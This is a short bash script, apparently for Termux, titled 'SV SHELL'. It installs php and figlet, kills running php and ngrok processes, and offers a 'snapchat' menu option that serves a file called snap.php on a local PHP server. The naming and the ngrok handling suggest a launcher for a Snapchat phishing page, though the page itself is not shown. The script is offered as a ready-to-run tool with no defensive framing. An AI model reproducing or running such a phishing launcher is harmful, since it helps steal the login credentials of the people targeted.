#!/bin/bash

clear
pkg install figlet -y 
pkg install php -y
clear
printf "\033[92m"
figlet SV SHELL
printf "\033[91m"
pkill -9 php
pkill -9 ngrok
printf "\033[96m [+] Enter 1 to use snapchat :\n\r"
echo "========================================="
printf "\033[91m"
read -p "{-} Enter "  shell

if [ $shell == '1' ];then

printf "Wait to starts :\n\r "
sleep 3
printf "\033[93m\n\r"

php -S localhost:8080 snap.php

fi
